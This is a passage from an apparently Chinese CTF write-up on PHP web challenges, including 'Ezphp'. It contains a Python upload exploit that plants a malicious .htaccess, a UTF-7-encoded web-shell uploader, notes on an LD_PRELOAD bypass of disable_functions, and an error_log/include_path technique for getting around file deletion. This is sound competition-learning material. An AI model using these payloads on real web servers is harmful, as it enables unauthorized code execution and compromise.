</span></span><span class=line><span class=cl><span class=n>VALID_WBMP</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00\x00\x8a\x39\x8a\x39\x0a</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://your_url/upload/?&#34;</span>
</span></span><span class=line><span class=cl><span class=n>RANDOM_DIRECTORY</span> <span class=o>=</span> <span class=s2>&#34;674b2fcf215d9e16619a0ad3648e704ee50377e5&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>COOKIES</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;PHPSESSID&#34;</span> <span class=p>:</span> <span class=s2>&#34;kivnml45mpi9ohknv2i8s8ecoj&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload_content</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;image&#34;</span> <span class=p>:</span> <span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>content</span><span class=p>,</span> <span class=s1>&#39;image/png&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;upload&#34;</span> <span class=p>:</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;Submit Query&#34;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>COOKIES</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>HT_ACCESS</span> <span class=o>=</span> <span class=n>VALID_WBMP</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>AddType application/x-httpd-php .zedd
</span></span></span><span class=line><span class=cl><span class=s2>php_value auto_append_file &#34;php://filter/convert.base64-decode/resource=source.zedd&#34;
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>TARGET_FILE</span> <span class=o>=</span> <span class=n>VALID_WBMP</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;AA&#34;</span> <span class=o>+</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;?php phpinfo();?&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>upload_content</span><span class=p>(</span><span class=s2>&#34;..htaccess&#34;</span><span class=p>,</span> <span class=n>HT_ACCESS</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>upload_content</span><span class=p>(</span><span class=s2>&#34;source.zedd&#34;</span><span class=p>,</span> <span class=n>TARGET_FILE</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>upload_content</span><span class=p>(</span><span class=s2>&#34;shell.zedd&#34;</span><span class=p>,</span> <span class=n>VALID_WBMP</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span> <span class=o>+</span> <span class=s2>&#34;/images/&#34;</span> <span class=o>+</span> <span class=n>RANDOM_DIRECTORY</span> <span class=o>+</span> <span class=s2>&#34;/shell.zedd&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=get-shell>Get Shell</h2><p>先看 phpinfo ，果不其然还要 bypass disable_function</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>pcntl_alarm</span><span class=p>,</span><span class=n>pcntl_fork</span><span class=p>,</span><span class=n>pcntl_waitpid</span><span class=p>,</span><span class=n>pcntl_wait</span><span class=p>,</span><span class=n>pcntl_wifexited</span><span class=p>,</span><span class=n>pcntl_wifstopped</span><span class=p>,</span><span class=n>pcntl_wifsignaled</span><span class=p>,</span><span class=n>pcntl_wifcontinued</span><span class=p>,</span><span class=n>pcntl_wexitstatus</span><span class=p>,</span><span class=n>pcntl_wtermsig</span><span class=p>,</span><span class=n>pcntl_wstopsig</span><span class=p>,</span><span class=n>pcntl_signal</span><span class=p>,</span><span class=n>pcntl_signal_get_handler</span><span class=p>,</span><span class=n>pcntl_signal_dispatch</span><span class=p>,</span><span class=n>pcntl_get_last_error</span><span class=p>,</span><span class=n>pcntl_strerror</span><span class=p>,</span><span class=n>pcntl_sigprocmask</span><span class=p>,</span><span class=n>pcntl_sigwaitinfo</span><span class=p>,</span><span class=n>pcntl_sigtimedwait</span><span class=p>,</span><span class=n>pcntl_exec</span><span class=p>,</span><span class=n>pcntl_getpriority</span><span class=p>,</span><span class=n>pcntl_setpriority</span><span class=p>,</span><span class=n>pcntl_async_signals</span><span class=p>,</span><span class=n>exec</span><span class=p>,</span><span class=n>passthru</span><span class=p>,</span><span class=n>shell_exec</span><span class=p>,</span><span class=n>system</span><span class=p>,</span><span class=n>proc_open</span><span class=p>,</span><span class=n>popen</span><span class=p>,</span><span class=n>pcntl_exec</span><span class=p>,</span><span class=n>posix_mkfifo</span><span class=p>,</span> <span class=n>pg_lo_import</span><span class=p>,</span> <span class=n>dbmopen</span><span class=p>,</span> <span class=n>dbase_open</span><span class=p>,</span> <span class=n>popen</span><span class=p>,</span> <span class=n>chgrp</span><span class=p>,</span> <span class=n>chown</span><span class=p>,</span> <span class=n>chmod</span><span class=p>,</span> <span class=n>symlink</span><span class=p>,</span><span class=n>apache_setenv</span><span class=p>,</span><span class=n>define_syslog_variables</span><span class=p>,</span> <span class=n>posix_getpwuid</span><span class=p>,</span> <span class=n>posix_kill</span><span class=p>,</span> <span class=n>posix_mkfifo</span><span class=p>,</span> <span class=n>posix_setpgid</span><span class=p>,</span> <span class=n>posix_setsid</span><span class=p>,</span> <span class=n>posix_uname</span><span class=p>,</span> <span class=n>proc_close</span><span class=p>,</span> <span class=n>pclose</span><span class=p>,</span> <span class=n>proc_nice</span><span class=p>,</span> <span class=n>proc_terminate</span><span class=p>,</span><span class=n>curl_exec</span><span class=p>,</span><span class=n>curl_multi_exec</span><span class=p>,</span><span class=n>parse_ini_file</span><span class=p>,</span><span class=n>show_source</span><span class=p>,</span><span class=n>imap_open</span><span class=p>,</span><span class=n>fopen</span><span class=p>,</span><span class=n>copy</span><span class=p>,</span><span class=n>rename</span><span class=p>,</span><span class=n>readfile</span><span class=p>,</span><span class=n>readlink</span><span class=p>,</span><span class=n>tmpfile</span><span class=p>,</span><span class=n>tempnam</span><span class=p>,</span><span class=n>touch</span><span class=p>,</span><span class=n>link</span><span class=p>,</span><span class=n>file_put_contents</span><span class=p>,</span><span class=n>file</span><span class=p>,</span><span class=n>ftp_connect</span><span class=p>,</span><span class=n>ftp_ssl_connect</span>
</span></span></code></pre></td></tr></table></div></div><p>没有禁止 <code>putenv()</code>，那我们就可以用 <code>LD_PRELOAD</code>那一套就行了。然而这里没有权限导致不能直接使用蚁剑的 as_bypass_php_disable_functions 插件，但是我们可以自己写一个上传界面上传我们需要的文件就行了。比如我们可以这么写 <code>.htaccess</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=c1>#define test_width 1337</span>
</span></span><span class=line><span class=cl><span class=c1>#define test_height 1337</span>
</span></span><span class=line><span class=cl><span class=n>AddType</span> <span class=n>application</span><span class=o>/</span><span class=n>x</span><span class=o>-</span><span class=n>httpd</span><span class=o>-</span><span class=n>php</span> <span class=o>.</span><span class=n>xbm</span>
</span></span><span class=line><span class=cl><span class=n>php_flag</span> <span class=n>zend</span><span class=o>.</span><span class=n>multibyte</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>php_value</span> <span class=n>zend</span><span class=o>.</span><span class=n>script_encoding</span> <span class=s2>&#34;UTF-7&#34;</span>
</span></span><span class=line><span class=cl><span class=n>php_value</span> <span class=n>auto_append_file</span> <span class=o>.</span><span class=n>htaccess</span>
</span></span><span class=line><span class=cl><span class=c1>#+ADw?php if (isset(+ACQAXw-POST+AFsAIg-upload+ACIAXQ)) +AHsAJA-tmp+AF8-name +AD0 +ACQAXw-FILES+AFsAIg-image+ACIAXQBbACI-tmp+AF8-name+ACIAXQA7ACQ-name +AD0 +ACQAXw-FILES+AFsAIg-image+ACIAXQBbACI-name+ACIAXQA7ACQ-parts +AD0 explode(+ACI.+ACI, +ACQ-name)+ADsAJA-ext +AD0 array+AF8-pop(+ACQ-parts)+ADsAJA-name +AD0 implode(+ACI.+ACI, +ACQ-parts)+ADs-move+AF8-uploaded+AF8-file(+ACQ-tmp+AF8-name, +ACI./+ACI.+ACQ-name . +ACI.+ACI . +ACQ-ext)+ADsAfQ?+AD4APA-h1+AD4-Upload your pics+ACEAPA-/h1+AD4APA-form method+AD0AIg-POST+ACI action+AD0AIg?+ACI enctype+AD0AIg-multipart/form-data+ACIAPgA8-input type+AD0AIg-file+ACI name+AD0AIg-image+ACIAPgA8-input type+AD0AIg-submit+ACI name+AD0-upload+AD4APA-/form+AD4-</span>
</span></span></code></pre></td></tr></table></div></div><p>UTF-7 解码之后就是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;upload&#34;</span><span class=p>]))</span> <span class=p>{</span><span class=nv>$tmp_name</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;image&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>];</span><span class=nv>$name</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;image&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>];</span><span class=nv>$parts</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>,</span> <span class=nv>$name</span><span class=p>);</span><span class=nv>$ext</span> <span class=o>=</span> <span class=nx>array_pop</span><span class=p>(</span><span class=nv>$parts</span><span class=p>);</span><span class=nv>$name</span> <span class=o>=</span> <span class=nx>implode</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>,</span> <span class=nv>$parts</span><span class=p>);</span><span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$tmp_name</span><span class=p>,</span> <span class=s2>&#34;./&#34;</span><span class=o>.</span><span class=nv>$name</span> <span class=o>.</span> <span class=s2>&#34;.&#34;</span> <span class=o>.</span> <span class=nv>$ext</span><span class=p>);}</span><span class=cp>?&gt;</span><span class=err>&lt;h1&gt;Upload your pics!&lt;/h1&gt;&lt;form method=&#34;POST&#34; action=&#34;?&#34; enctype=&#34;multipart/form-data&#34;&gt;&lt;input type=&#34;file&#34; name=&#34;image&#34;&gt;&lt;input type=&#34;submit&#34; name=upload&gt;&lt;/form&gt;
</span></span></span></code></pre></td></tr></table></div></div><p>然后就是上传 .so 文件进行 LD_PRELOAD 那一套了，比较坑的是，拿到 flag 还是需要一个在极短时间内算数的门槛，这里就直接借鉴其他人的脚本了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-perl data-lang=perl><span class=line><span class=cl><span class=ch>#!/usr/bin/env perl </span>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nn>warnings</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nn>strict</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nn>IPC::Open2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=vg>$|</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>chdir</span> <span class=s>&#34;/&#34;</span><span class=p>;</span> <span class=c1>#!!!!!!!!!!!!!!!!!!!!!!!!!!</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$pid</span> <span class=o>=</span> <span class=n>open2</span><span class=p>(</span><span class=o>\*</span><span class=n>out2</span><span class=p>,</span> <span class=o>\*</span><span class=n>in2</span><span class=p>,</span> <span class=s>&#39;./get_flag&#39;</span><span class=p>)</span> <span class=ow>or</span> <span class=nb>die</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$reply</span> <span class=o>=</span> <span class=sr>&lt;out2&gt;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>print</span> <span class=bp>STDOUT</span> <span class=nv>$reply</span><span class=p>;</span> <span class=c1>#string: solve captcha..</span>
</span></span><span class=line><span class=cl><span class=nv>$reply</span> <span class=o>=</span> <span class=sr>&lt;out2&gt;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>print</span> <span class=bp>STDOUT</span> <span class=nv>$reply</span><span class=p>;</span> <span class=c1>#captcha formula</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>my</span> <span class=nv>$answer</span> <span class=o>=</span> <span class=nb>eval</span><span class=p>(</span><span class=nv>$reply</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>print</span> <span class=bp>STDOUT</span> <span class=s>&#34;answer: $answer\n&#34;</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>print</span> <span class=n>in2</span> <span class=s>&#34; $answer &#34;</span><span class=p>;</span> <span class=c1>#send it to process</span>
</span></span><span class=line><span class=cl><span class=nn>in2</span><span class=o>-&gt;</span><span class=n>flush</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$reply</span> <span class=o>=</span> <span class=sr>&lt;out2&gt;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>print</span> <span class=bp>STDOUT</span> <span class=nv>$reply</span><span class=p>;</span> <span class=c1>#flag :D</span>
</span></span></code></pre></td></tr></table></div></div><p>直接传上去运行就行了。</p><p>Permalink before if: https://blogpic.zdy.one/img/20190830010343.png<img src=https://blogpic.zdy.one/img/20190830010343.png loading=lazy></p><h1 id=ezphp>Ezphp</h1><p>让我们回到本次的主题 Ezphp，题目直接给出了源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl> <span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=nv>$files</span> <span class=o>=</span> <span class=nx>scandir</span><span class=p>(</span><span class=s1>&#39;./&#39;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>    <span class=k>foreach</span><span class=p>(</span><span class=nv>$files</span> <span class=k>as</span> <span class=nv>$file</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>is_file</span><span class=p>(</span><span class=nv>$file</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nv>$file</span> <span class=o>!==</span> <span class=s2>&#34;index.php&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>unlink</span><span class=p>(</span><span class=nv>$file</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>include_once</span><span class=p>(</span><span class=s2>&#34;fl3g.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;content&#39;</span><span class=p>])</span> <span class=o>||</span> <span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$content</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;content&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>stristr</span><span class=p>(</span><span class=nv>$content</span><span class=p>,</span><span class=s1>&#39;on&#39;</span><span class=p>)</span> <span class=o>||</span> <span class=nx>stristr</span><span class=p>(</span><span class=nv>$content</span><span class=p>,</span><span class=s1>&#39;html&#39;</span><span class=p>)</span> <span class=o>||</span> <span class=nx>stristr</span><span class=p>(</span><span class=nv>$content</span><span class=p>,</span><span class=s1>&#39;type&#39;</span><span class=p>)</span> <span class=o>||</span> <span class=nx>stristr</span><span class=p>(</span><span class=nv>$content</span><span class=p>,</span><span class=s1>&#39;flag&#39;</span><span class=p>)</span> <span class=o>||</span> <span class=nx>stristr</span><span class=p>(</span><span class=nv>$content</span><span class=p>,</span><span class=s1>&#39;upload&#39;</span><span class=p>)</span> <span class=o>||</span> <span class=nx>stristr</span><span class=p>(</span><span class=nv>$content</span><span class=p>,</span><span class=s1>&#39;file&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;Hacker&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$filename</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/[^a-z\.]/&#34;</span><span class=p>,</span> <span class=nv>$filename</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;Hacker&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$files</span> <span class=o>=</span> <span class=nx>scandir</span><span class=p>(</span><span class=s1>&#39;./&#39;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>    <span class=k>foreach</span><span class=p>(</span><span class=nv>$files</span> <span class=k>as</span> <span class=nv>$file</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>is_file</span><span class=p>(</span><span class=nv>$file</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nv>$file</span> <span class=o>!==</span> <span class=s2>&#34;index.php&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>unlink</span><span class=p>(</span><span class=nv>$file</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$filename</span><span class=p>,</span> <span class=nv>$content</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>Just one chance&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err> 
</span></span></span></code></pre></td></tr></table></div></div><p>很明显，这里我们可以直接写入<code>.htaccess</code>来 get flag。</p><p>我们可以看到有以下限制：</p><ul><li>每次都会<code>unlink</code>删除当前所有文件</li><li>有 on / html / type / flag / upload / file 关键字大小写过滤</li><li>文件自动包含<code>fl3g.php</code>，但是文件名有<code>/[^a-z\.]/</code>正则限制</li><li>最后还会有<code>\n</code>换行追加数据导致<code>.htaccess</code>解析错误的限制</li></ul><p>这里比赛的时候比较恶心的是 ichunqiu 自动给容器套了一层 nginx 代理，404 或者 500 的时候返回的是 nginx 错误页面&mldr;然后当时我是排除了 .htaccess 的利用&mldr;然后就偏了&mldr;</p><p>有了上题的知识其实我们不难有一些思路：可以利用编码绕过一些判定，例如<code>stristr</code>函数的判断。</p><p>而且这里比较让我们值得注意的是<code>fl3g.php</code>的包含，虽然每次都会首先执行删除当前目录下所有的文件，但是之后又都会去尝试包含<code>fl3g.php</code>，那我们是不是可以有什么操作去写入<code>fl3g.php</code>呢？当然如果通过题目给的写入功能由于有<code>[^a-z\.]</code>正则的存在是肯定写不进去的。</p><p>于是我们需要把写入文件的功能点放在<code>.htaccess</code>关注点上来，根据 <a class=link href=https://www.php.net/manual/en/configuration.changes.php target=_blank rel=noopener>How to change configuration settings</a> ，我们可以知道在<code>.htaccess</code>当中我们可以使用几种类型格式来更改 php 配置</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php_value name value
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>php_flag name on|off
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>php_admin_value name value
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>php_admin_flag name on|off
</span></span></code></pre></td></tr></table></div></div><p>虽然<code>flag</code>被作为关键字过滤了，但是无论是<code>php_flag</code>还是<code>php_amdin_flag</code>只是<code>php_value</code>的简化，能通过<code>php_flag</code>设置的参数我们大部分还是都可以用<code>php_value</code>去设置的，虽然文档有以下说明：</p><blockquote><p>​ <strong>Note</strong>: Don&rsquo;t use <code>php_value</code> to set boolean values. <code>php_flag</code> (see below) should be used instead.</p></blockquote><p>在 <a class=link href=https://www.php.net/manual/en/ini.list.php target=_blank rel=noopener>List of php.ini directives</a> 当中我们可以找到支持更改的 php 配置选项，其中有几个我们值得去关注。</p><h3 id=one-way-error>One Way-error</h3><blockquote><p>​ <code>error_log</code> <a class=link href=https://www.php.net/manual/en/language.types.string.php target=_blank rel=noopener>string</a></p><p>Name of the file where script errors should be logged. The file should be writable by the web server&rsquo;s user. If the special value <em>syslog</em> is used, the errors are sent to the system logger instead. On Unix, this means syslog(3) and on Windows it means the event log. See also: <a class=link href=https://www.php.net/manual/en/function.syslog.php target=_blank rel=noopener>syslog()</a>. If this directive is not set, errors are sent to the SAPI error logger. For example, it is an error log in Apache or <em>stderr</em> in CLI. See also <a class=link href=https://www.php.net/manual/en/function.error-log.php target=_blank rel=noopener>error_log()</a>.</p></blockquote><p><code>error_log</code>可以把<code>error_reporting</code>设置的错误等级写入到设置的文件当中，这个看起来我们可以利用该函数来就进行报错写入文件，但是对于一开始就删除当前文件夹下所有文件的操作，即使我们可以写入自定义内容，也会被删除。所以我们可能还需要找另外一条路径使得该文件可以保存下来。</p><blockquote><p>​ <code>include_path</code> <a class=link href=https://www.php.net/manual/en/language.types.string.php target=_blank rel=noopener>string</a></p><p>Specifies a list of directories where the <a class=link href=https://www.php.net/manual/en/function.require.php target=_blank rel=noopener>require</a>, <a class=link href=https://www.php.net/manual/en/function.include.php target=_blank rel=noopener>include</a>, <a class=link href=https://www.php.net/manual/en/function.fopen.php target=_blank rel=noopener>fopen()</a>, <a class=link href=https://www.php.net/manual/en/function.file.php target=_blank rel=noopener>file()</a>, <a class=link href=https://www.php.net/manual/en/function.readfile.php target=_blank rel=noopener>readfile()</a> and <a class=link href=https://www.php.net/manual/en/function.file-get-contents.php target=_blank rel=noopener>file_get_contents()</a> functions look for files. The format is like the system&rsquo;s PATH environment variable: a list of directories separated with a colon in Unix or semicolon in Windows.</p><p>PHP considers each entry in the include path separately when looking for files to include. It will check the first path, and if it doesn&rsquo;t find it, check the next path, until it either locates the included file or returns with a <a class=link href=https://www.php.net/manual/en/ini.core.php target=_blank rel=noopener>warning</a> or an <a class=link href=https://www.php.net/manual/en/ini.core.php target=_blank rel=noopener>error</a>. You may modify or set your include path at runtime using <a class=link href=https://www.php.net/manual/en/function.set-include-path.php target=_blank rel=noopener>set_include_path()</a>.</p></blockquote><p>在阅读文档我们还可以发现<code>include_path</code>这个设置，他可以指定<code>include</code>等包含函数包含的环境路径，而题目代码使用的是<code>scandir('./'); </code>作为获取当前文件的操作，只是删除当前文件，而<code>error_log</code>又可以指定路径。所以我们大概可以有这么个思路：</p><ul><li>使用<code>error_log</code>指定一个非当前文件路径的可写路径，例如<code>/tmp/fl3g.php</code></li><li>利用<code>include_path</code>指定包含的环境路径为<code>/tmp</code></li><li>这样<code>include</code>包含的时候，就是包含到了<code>/tmp/fl3g.php</code></li></ul><p>这样就可以绕过删除当前文件夹下所有文件的操作了。</p><p>接下来就是<code>error_log</code>写文件内容的问题了，让我们本地试试看，为了方便，按照上面的思路直接写一个<code>.htaccess</code>在当前文件夹下，内容是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php_value error_log /tmp/fl3g.php
</span></span><span class=line><span class=cl>php_value include_path /tmp
</span></span></code></pre></td></tr></table></div></div><p>访问<code>index.php</code>，得到的错误有</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
